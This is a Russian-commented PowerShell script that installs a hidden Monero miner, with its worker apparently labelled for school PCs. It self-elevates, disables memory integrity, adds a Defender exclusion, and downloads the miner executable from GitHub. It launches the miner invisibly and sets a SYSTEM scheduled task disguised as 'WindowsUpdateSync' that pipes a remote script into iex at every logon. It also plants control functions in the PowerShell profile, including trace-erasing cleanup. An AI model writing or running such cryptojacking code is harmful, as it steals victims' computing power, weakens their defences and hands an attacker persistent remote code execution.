# 0. Самовозвышение до Администратора (Лифт)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК ПОЛНОЙ СИСТЕМЫ (NANOPOOL + POWER MOD) ---" -ForegroundColor Cyan

# 1. Максимальная производительность (Электропитание)
Write-Host "[1/9] Настройка питания..." -NoNewline
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c -ErrorAction SilentlyContinue
Write-Host " Максимум." -ForegroundColor Green

# 2. Остановка старых процессов
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue

# 3. Разблокировка памяти и ядра
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# 4. Антивирус и папка
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 5. Загрузка майнера
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    Write-Host "[OK] Ядро на месте." -ForegroundColor Green
} catch {
    Write-Host "[!] Ошибка загрузки!" -ForegroundColor Red; exit
}

# 6. Файл запуска (NANOPOOL: ПОРТ 14433 + TLS)
# Если Nanopool тоже выдаст canceled, заменим порт на 80 в этой строке
$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o xmr-eu1.nanopool.org:14433 -u $wallet.school_pc -p x --algo rx/0 --donate-level 1 --tls"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 7. Скрытая автозагрузка (SYSTEM)
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null

# 8. Функции контроля (check со статусом памяти, update, delete)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
        Write-Host "Потоков: `$(`$p.Threads.Count)" -ForegroundColor Gray
    } else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
function update { 
    Write-Host "Обновление конфигурации..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    irm '$rawScript' | iex 
}
function delete {
    Write-Host "ПОЛНАЯ ОЧИСТКА..." -ForegroundColor Red
    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
    Write-Host "ГОТОВО. Следов нет." -ForegroundColor Green
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force

# 9. Старт
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- СИСТЕМА ПОЛНОСТЬЮ ОБНОВЛЕНА ---" -ForegroundColor Magenta
Write-Host "Команды: check, update, delete" -ForegroundColor Gray
